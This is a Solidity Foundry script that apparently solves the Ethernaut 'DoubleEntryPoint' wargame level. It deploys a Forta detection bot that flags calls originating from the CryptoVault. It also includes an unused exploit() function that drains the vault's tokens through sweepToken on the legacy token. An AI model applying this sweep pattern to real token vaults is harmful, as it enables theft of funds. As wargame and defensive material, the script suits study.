// SPDX-License-Identifier: MTI
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/26_DoubleEntryPoint.sol";

contract DetectionBot {
    address public cryptovault_addr;
    address public forta_addr;

    constructor(address _cryptovault_addr, address _forta_addr) {
        cryptovault_addr = _cryptovault_addr;
        forta_addr = _forta_addr;
    }

    event info(address _info, address _info2);

    function handleTransaction(address _user, bytes calldata msgData) external {
        address origSender;

        assembly {
            origSender := calldataload(0xa8)
        }

        emit info(origSender, cryptovault_addr);

        if (origSender == cryptovault_addr) {
                Forta(forta_addr).raiseAlert(_user);
        }
    }
}

contract POC is Script {
    DoubleEntryPoint public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = DoubleEntryPoint(0xe1b487Fa772428e8FC92179003876f1bBF145dfC);
        address forta_addr = address(target.forta());
        address cryptovault_addr = target.cryptoVault();
        DetectionBot bot = new DetectionBot(cryptovault_addr, forta_addr);
        Forta forta = Forta(forta_addr);

        forta.setDetectionBot(address(bot));

        // exploit();

        vm.stopBroadcast();
    }

    function exploit() public {
        address cryptovault_addr = target.cryptoVault();
        console.log("crypto vault: ", cryptovault_addr);

        CryptoVault cryptovault = CryptoVault(cryptovault_addr);
        address receipt = cryptovault.sweptTokensRecipient();
        console.log("receipt: ", receipt);
        address lpt_addr = target.delegatedFrom();
        LegacyToken lpt = LegacyToken(lpt_addr);
        console.log("lpt addr: ", lpt_addr);

        uint256 balance = target.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("brfore balance: ", balance);

        cryptovault.sweepToken(lpt);

        balance = target.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("after  balance: ", balance);
    }
}
